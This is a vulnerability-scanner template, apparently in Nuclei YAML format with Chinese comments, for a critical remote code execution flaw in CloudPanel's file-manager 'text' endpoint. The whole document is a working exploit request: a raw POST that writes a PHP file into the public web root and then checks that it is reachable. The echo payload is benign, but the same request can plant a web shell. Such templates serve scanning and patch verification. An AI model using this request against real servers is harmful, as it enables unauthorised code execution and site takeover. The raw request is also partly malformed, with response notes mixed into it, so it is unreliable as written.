id: poc-do3nq1m1wn7q9dgp
info:
  name: CloudPanel text接口存在远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2024
http:
- raw:
  - 'POST /file-manager/backend/text HTTP/1.1


    Accept-Encoding: gzip, deflate


    Accept: */*


    Connection: close


    Cookie: clp-


    Content-Type: application/x-www-form-urlencoded


    id=/htdocs/app/files/public/dudesite.php&content=<?php echo ''dudesite'';?>


    # 响应代码特征

    200


    # 响应内容特征

    dudesite.php


    # 上传文件定位

    /dudesite.php'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
